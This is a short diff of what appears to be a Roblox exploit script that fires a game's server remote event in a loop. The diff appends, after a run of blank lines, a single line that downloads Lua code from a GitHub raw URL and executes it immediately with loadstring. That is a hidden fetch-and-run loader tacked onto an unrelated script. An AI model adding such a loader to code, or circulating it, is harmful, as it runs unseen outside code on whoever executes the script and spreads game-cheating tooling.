@@ -545,3 +545,9 @@ local args = {
 game:GetService("ReplicatedStorage"):FindFirstChild("Remote Events").BreakSnowEvent:FireServer(unpack(args))
 end
 end
+
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jj123llol/My-personal-admin/main/admin",true))()
